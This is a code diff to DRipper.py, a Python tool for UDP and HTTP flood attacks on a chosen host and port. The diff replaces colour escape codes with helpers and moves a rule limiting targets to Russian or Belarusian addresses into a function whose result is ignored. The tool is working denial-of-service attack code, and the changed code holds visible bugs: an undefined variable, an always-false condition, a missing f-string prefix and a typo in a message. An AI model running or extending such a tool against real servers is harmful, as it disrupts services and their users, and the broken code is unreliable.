@@ -14,13 +14,30 @@ from datetime import datetime
 from optparse import OptionParser
 
 
+def color_txt(color_code, *texts):
+    joined_text = ''.join(str(x) for x in texts)
+    return f'\033[{color_code}m{joined_text}\033[0;0m'
+
+def red_txt(*texts):
+    return color_txt('91', *texts)
+
+def blue_txt(*texts):
+    return color_txt('94', *texts)
+
+def green_txt(*texts):
+    return color_txt('92', *texts)
+
+def pink_txt(*texts):
+    return color_txt('95', *texts)
+
+
 # Constants
 USAGE = 'Usage: python %prog [options] arg'
 EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'
-GETTING_SERVER_IP_ERROR_MSG = "\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m"
+GETTING_SERVER_IP_ERROR_MSG = red_txt('Can\'t get server IP. Packet sending failed. Check your VPN.')
 SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC = 120
-NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG = f"\033[91mThere are no successful connections more than 2 min. " \
-                                      f"Check your VPN or change host/port.\033[0m"
+NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG = red_txt('There are no successful connections more than 2 min. ' \
+                                      'Check your VPN or change host/port.')
 
 lock = threading.Lock()
 
@@ -30,6 +47,7 @@ class Context:
     """Class for passing a context to a parallel processes."""
     # Input params
     host: str = ''
+    original_host: str = ''
     port: int = 80
     threads: int = 100
     max_random_packet_len: int = 0
@@ -59,9 +77,11 @@ class Context:
     getting_ip: bool = False
 
 
-def init_context(_ctx, args):
+def init_context(_ctx: Context, args):
     """Initialize Context from Input args."""
     _ctx.host = args[0].host
+    _ctx.host_ip = ''
+    _ctx.original_host = args[0].host
     _ctx.port = args[0].port
     _ctx.protocol = 'https://' if args[0].port == 443 else 'http://'
     _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"
@@ -164,7 +184,7 @@ def down_it_http(_ctx: Context):
             _ctx.connections_failed += 1
         else:
             _ctx.connections_success += 1
-            # print('\033[92m HTTP-Request was done \033[0;0m')
+            # print(green_txt('HTTP-Request was done')))
 
         _ctx.packets_sent += 1
 
@@ -177,7 +197,7 @@ def down_it_http(_ctx: Context):
 
 
 def logo():
-    print(''' \033[0;95m
+    print(pink_txt('''
 
 ██████╗ ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗
 ██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
@@ -190,7 +210,7 @@ It is the end user's responsibility to obey all applicable laws.
 It is just like a server testing script and Your IP is visible.
 
 Please, make sure you are ANONYMOUS!
-    \033[0m ''')
+    '''))
 
 
 def usage(parser):
@@ -229,16 +249,19 @@ def parser_add_options(parser):
                       help='Attack to server IP')
 
 
-def get_ip_by_host(host):
+def update_host_ip(_ctx: Context):
     """Gets target's IP by host"""
-    host_ip = ''
-
     try:
-        host_ip = socket.gethostbyname(host)
+        _ctx.host_ip = socket.gethostbyname(host)
     except:
         pass
 
-    return host_ip
+
+def update_start_ip(_ctx: Context):
+    """Updates start ip"""
+    current_ip = get_current_ip()
+    if current_ip:
+        _ctx.start_ip = current_ip
 
 
 def connect_host(_ctx: Context):
@@ -255,7 +278,7 @@ def connect_host(_ctx: Context):
 def get_first_ip_part(ip: str) -> str:
     parts = ip.split('.')
     if len(parts) > 1:
-        return f"{parts[0]}.*.*.*"
+        return f'{parts[0]}.*.*.*'
     else:
         return parts[0]
 
@@ -267,14 +290,17 @@ def show_info(_ctx: Context):
     my_ip_masked = get_first_ip_part(_ctx.start_ip)
     is_random_packet_len = _ctx.attack_method == 'udp' and _ctx.random_packet_len
 
-    your_ip = f'\033[94m{my_ip_masked}\033[0m'
-    check_vpn = f'\033[91mIP was changed, check VPN (current IP: {my_ip_masked})\033[0m' if _ctx.current_ip and _ctx.current_ip != _ctx.start_ip else ''
-    target_host = f'\033[94m{_ctx.host}:{_ctx.port}\033[0m'
-    load_method = f'\033[94m{str(_ctx.attack_method).upper()}\033[0m'
-    thread_pool = f'\033[94m{_ctx.threads}\033[0m'
-    available_cpu = f'\033[94m{_ctx.cpu_count}\033[0m'
-    rnd_packet_len = f'\033[94mYES\033[0m' if is_random_packet_len else f'\033[94mNO\033[0m'
-    max_rnd_packet_len = f'\033[94m{_ctx.max_random_packet_len}\033[0m' if is_random_packet_len else f'\033[94mNOT REQUIRED\033[0m'
+    if len(_ctx.start_ip) < 0:
+        your_ip = blue_txt(my_ip_masked)
+    else:
+        your_ip = red_txt('Can\'t get your IP. Check internet connection.')
+    check_vpn = red_txt('IP was changed, check VPN (current IP: {my_ip_masked})') if _ctx.current_ip and _ctx.current_ip != _ctx.start_ip else ''
+    target_host = blue_txt(f'{_ctx.host}:{_ctx.port}')
+    load_method = blue_txt(f'{str(_ctx.attack_method).upper()}')
+    thread_pool = blue_txt(f'{_ctx.threads}')
+    available_cpu = blue_txt(f'{_ctx.cpu_count}')
+    rnd_packet_len = blue_txt('YES' if is_random_packet_len else 'NO')
+    max_rnd_packet_len = blue_txt(_ctx.max_random_packet_len if is_random_packet_len else 'NOT REQUIRED')
 
     print('------------------------------------------------------')
     print(f'Start time:                 {_ctx.start_time.strftime("%Y-%m-%d %H:%M:%S")}')
@@ -306,8 +332,8 @@ def show_statistics(_ctx: Context):
     print("\033c")
     show_info(_ctx)
 
-    connections_success = f'\033[92m{_ctx.connections_success}\033[0;0m'
-    connections_failed = f'\033[91m{_ctx.connections_failed}\033[0;0m'
+    connections_success = green_txt(_ctx.connections_success)
+    connections_failed = red_txt(_ctx.connections_failed)
 
     curr_time = datetime.now() - _ctx.start_time
 
@@ -321,7 +347,7 @@ def show_statistics(_ctx: Context):
     if _ctx.errors:
         print('\n\n')
     for error in _ctx.errors:
-        print(f"\033[91m{error}\033[0;0m\n")
+        print(red_txt(error))
         print('\007')
 
     sys.stdout.flush()
@@ -357,7 +383,7 @@ def create_thread_pool(_ctx: Context) -> list:
 
 def get_current_ip():
     """Gets user IP."""
-    current_ip = "No info"
+    current_ip = 'No info'
     try:
         current_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
     except:
@@ -368,9 +394,9 @@ def get_current_ip():
 
 def get_host_country(host_ip):
     """Gets country of the target's IP"""
-    country = "NOT DEFINED"
+    country = 'NOT DEFINED'
     try:
-        response_body = urllib.request.urlopen(f"https://ipinfo.io/{host_ip}").read().decode('utf8')
+        response_body = urllib.request.urlopen(f'https://ipinfo.io/{host_ip}').read().decode('utf8')
         response_data = json.loads(response_body)
         country = response_data['country']
     except:
@@ -403,32 +429,40 @@ def check_successful_connections(_ctx: Context):
 def validate_input(args):
     """Validates input params."""
     if int(args.port) < 0:
-        print("\033[91mWrong port number.\033[0m")
+        print(red_txt('Wrong port number.'))
         return False
 
     if int(args.threads) < 1:
-        print("\033[91mWrong threads number.\033[0m\n")
+        print(red_txt('Wrong threads number.'))
         return False
 
     if args.attack_method not in ('udp', 'http'):
-        print("\033[91mWrong attack type. Possible options: udp, http.\033[0m\n")
+        print(red_txt('Wrong attack type. Possible options: udp, http.'))
         return False
 
     if not args.host:
-        print("\033[91mHost wasn't detected\033[0m\n")
+        print(red_txt('Host wasn\'t detected'))
         return False
 
-    host_ip = get_ip_by_host(args.host)
-    if host_ip == '':
-        print("\033[91mCheck server IP and port! Wrong format of server name or no connection.\033[0m\n")
-        return False
+    # host_ip = get_ip_by_host(args.host)
+    # if host_ip == '':
+    #     print("\033[91mCheck server IP and port! Wrong format of server name or no connection.\033[0m\n")
+    #     return False
 
-    host_country = get_host_country(host_ip)
+    # host_country = get_host_country(host_ip)
+    # if host_country not in ('RU', 'BY'):
+    #     print(f"\033[91mHost's location ({host_country}) is not allowed.\033[0m\n")
+    #     return False
+
+    return True
+
+
+def go_home(_ctx: Context):
+    """Modifies host to match the rules"""
+    host_country = get_host_country(_ctx.host_ip)
     if host_country not in ('RU', 'BY'):
         print(f"\033[91mHost's location ({host_country}) is not allowed.\033[0m\n")
         return False
-
-    return True
 
 
 def main():
@@ -440,16 +474,13 @@ def main():
         usage(parser)
 
     init_context(_ctx, args)
-    current_ip = get_current_ip()
-    if current_ip:
-        _ctx.start_ip = current_ip
-    else:
-        _ctx.start_ip = "\033[91mCan't get your IP. Check internet connection.\033[0m"
-
+    update_host_ip(_ctx)
+    update_start_ip(_ctx)
+    go_home(_ctx)
     connect_host(_ctx)
 
-    print("\033[92m", _ctx.host, " port: ", _ctx.port, " threads: ", _ctx.threads, "\033[0m")
-    print("\033[94mPlease wait...\033[0m")
+    print(green_txt(_ctx.host, ' port: ', _ctx.port, ' threads: ', _ctx.threads))
+    print(blue_txt('lease wait...'))
 
     time.sleep(1)
     show_info(_ctx)
